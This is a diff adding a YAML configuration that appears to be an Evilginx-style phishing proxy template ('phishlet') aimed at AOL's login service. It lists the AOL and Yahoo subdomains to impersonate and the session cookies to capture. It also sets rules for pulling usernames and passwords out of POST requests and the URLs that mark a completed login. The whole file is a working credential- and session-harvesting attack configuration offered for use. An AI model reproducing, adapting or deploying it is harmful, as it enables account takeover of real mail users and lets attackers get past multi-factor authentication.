@@ -1,0 +1,58 @@
+name: 'aol'
+author: '@cultist'
+min_ver: '3.0.2'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'aol.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: '3p-geo', orig_sub: '3p-geo', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 's', orig_sub: 's', domain: 'yimg.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '3p-udc', orig_sub: '3p-udc', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'hb', orig_sub: 'hb', domain: 'yahoo.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'oidc.www', orig_sub: 'oidc.www', domain: 'aol.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'guce', orig_sub: 'guce', domain: 'aol.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'aol.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'mail', orig_sub: 'www', domain: 'aol.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'api.login', orig_sub: 'api.login', domain: 'aol.com', session: true, is_landing: false, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'www', domain: 'aol.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'oidc.www', domain: 'aol.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'guce', domain: 'aol.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'hb', domain: 'yahoo.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'login.aol.com', orig_sub: '3p-geo', domain: 'yahoo.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'login.aol.com', orig_sub: '3p-udc', domain: 'yahoo.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'mail', domain: 'aol.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'login.aol.com', orig_sub: 's', domain: 'yimg.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'api.login', domain: 'aol.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+auth_tokens:
+  - domain: '.aol.com'
+    keys: ['OTH', 'A1S', '_li_dcdm_c', '.*,regexp']
+  - domain: '.login.aol.com'
+    keys: ['AS', 'T', 'Y', '.*,regexp']
+  - domain: '.www.aol.com'
+    keys: ['OTHP', '.*,regexp']                 
+auth_urls:
+  - '/account/challenge/password'
+  - '/oauth2/request_auth'
+  - '/login'                
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+force_post:
+  - path: '/'
+    search:
+      - {key: 'username', search: '.*'}
+      - {key: 'password', search: '.*'}
+    force:
+      - {key: 'prefersReducedMotion', value: 'true'}
+      - {key: 'sessionIndex', value: 'QQ--'}
+      - {key: 'verifyPassword', value: 'Next'}
+    type: 'post'
+login:
+  domain: 'login.aol.com'
+  path: '/'
